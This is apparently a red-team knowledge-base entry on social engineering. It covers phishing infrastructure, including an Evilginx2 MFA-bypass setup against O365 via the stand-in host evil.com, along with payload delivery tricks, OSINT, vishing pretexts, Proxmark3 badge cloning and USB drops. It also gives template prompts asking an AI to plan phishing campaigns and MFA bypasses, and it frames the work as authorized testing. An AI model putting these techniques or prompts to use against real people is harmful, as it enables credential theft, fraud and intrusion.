---
id: "social-engineering"
title: "Social Engineering Methodology for Red Teams"
type: "technique"
category: "social-engineering"
subcategory: "phishing"
tags: ["social-engineering", "phishing", "pretexting", "vishing", "spearphishing", "credential-harvesting", "deep-dig"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
related: ["oauth-jwt-saml-bypasses", "payout-maximization"]
updated: "2026-03-30"
---

## Overview

Social engineering exploits human psychology rather than technical vulnerabilities. In red team engagements, it's often the fastest path to initial access — bypassing firewalls, EDR, and MFA by targeting the weakest link: people. This guide covers phishing, pretexting, vishing, and physical social engineering from a red team perspective.

## Phishing Campaigns

### Infrastructure Setup
```bash
# Domain acquisition
# Buy lookalike domains: corp-login.com, c0rp.com, corp-sso.com
# Use expired domains with existing reputation

# GoPhish setup (phishing framework)
docker run -d --name gophish -p 3333:3333 -p 8080:8080 gophish/gophish

# Evilginx2 (real-time phishing proxy - bypasses MFA)
evilginx2
: config domain evil.com
: config ip EXTERNAL_IP
: phishlets hostname o365 login.evil.com
: phishlets enable o365
: lures create o365

# Email deliverability
# SPF, DKIM, DMARC setup for sending domain
# Use mail providers with good IP reputation
```

### Payload Delivery
```bash
# Macro-enabled documents (declining effectiveness)
# HTML smuggling (bypasses email gateways)
# OneNote files with embedded scripts
# ISO/IMG files containing LNK shortcuts
# QR code phishing (quishing) - bypasses email link scanners

# HTML smuggling template
# Embed base64-encoded payload in HTML that auto-downloads on open
```

### Phishing Templates (2026 Effective Pretexts)
- MFA reset notification ("Your MFA token expires in 24 hours")
- IT helpdesk password rotation
- Shared document notification (OneDrive/SharePoint/Google)
- Invoice or payment confirmation
- Calendar invite with malicious link
- Software update notification
- Security alert ("unusual sign-in detected")

## Spear Phishing

### OSINT for Targeting
```bash
# LinkedIn reconnaissance
# Identify targets: new employees, IT staff, executives, finance

# Email format discovery
# theHarvester, Hunter.io, email-format.com
theHarvester -d corp.com -l 500 -b google,bing,linkedin

# Social media analysis
# Facebook, Instagram, Twitter for personal details
# Used to build convincing pretexts

# Technology stack identification
# BuiltWith, Wappalyzer, job postings
# Tailor phishing payload to their stack (e.g., fake Jira notification)
```

### Targeted Payloads
```
# C-Suite: Board meeting agenda, quarterly report, M&A document
# HR: Resume/CV with macro, benefits enrollment
# Finance: Invoice, wire transfer confirmation, tax document
# IT: Security alert, system update, vendor notification
# Legal: Contract review, NDA, compliance notification
```

## Vishing (Voice Phishing)

### Call Pretexts
- IT helpdesk: "We detected unusual activity on your account"
- Vendor support: "We need to verify your account for a service update"
- Internal audit: "Compliance check on access controls"
- Delivery service: "Package delivery requires confirmation"

### Vishing Tips
- Research the target's name, department, and recent projects
- Spoof caller ID to match internal helpdesk number
- Create urgency without panic
- Have a fallback story if questioned
- Record calls (where legal) for evidence

## Physical Social Engineering

### Techniques
- **Tailgating** — Follow authorized personnel through secure doors
- **Badge cloning** — Proxmark3 for HID/RFID badge duplication
- **USB drop** — Leave malicious USB drives in parking lots, break rooms
- **Impersonation** — Delivery driver, IT contractor, vendor representative
- **Dumpster diving** — Recover credentials, network diagrams, org charts

### Physical Recon
```bash
# Proxmark3 badge cloning
proxmark3> lf search     # Detect card type
proxmark3> lf hid read   # Read HID badge
proxmark3> lf hid clone  # Clone to blank card

# WiFi Pineapple (rogue AP for credential capture)
# Rubber Ducky / Bash Bunny (USB attack tools)
```

## Deep Dig Prompts

```
Given this target organization profile [name, industry, size, tech stack, key personnel]:
1. Design a 3-phase phishing campaign (broad awareness test, spear phishing, executive targeting).
2. Suggest 5 pretexts tailored to their industry and recent events.
3. Recommend infrastructure setup (domains, email providers, landing pages).
4. Identify the highest-value targets for initial access.
5. Design a vishing script for the IT helpdesk scenario.
```

```
I need to bypass MFA for [target organization]:
1. Design an Evilginx2 phishlet for their SSO provider.
2. Suggest callback phishing (BazarCall-style) approaches.
3. Recommend QR code phishing for mobile-first targets.
4. Identify MFA fatigue / push notification abuse opportunities.
```

## Tools

- **GoPhish** — Open-source phishing framework
- **Evilginx2** — Reverse proxy phishing (MFA bypass)
- **SET (Social Engineering Toolkit)** — Multi-vector social engineering
- **King Phisher** — Phishing campaign toolkit
- **Modlishka** — Reverse proxy for credential interception
- **Proxmark3** — RFID/NFC badge cloning
- **WiFi Pineapple** — Rogue AP platform
- **theHarvester** — Email and domain OSINT

## Legal & Ethical Considerations

- Always operate under a signed Rules of Engagement (RoE)
- Get explicit written authorization for social engineering tests
- Define scope clearly: which employees, which methods, what's off-limits
- Have an emergency contact if someone becomes distressed
- Debrief targets after the engagement (training opportunity)
- Never use personal information in ways that could cause harm beyond the engagement
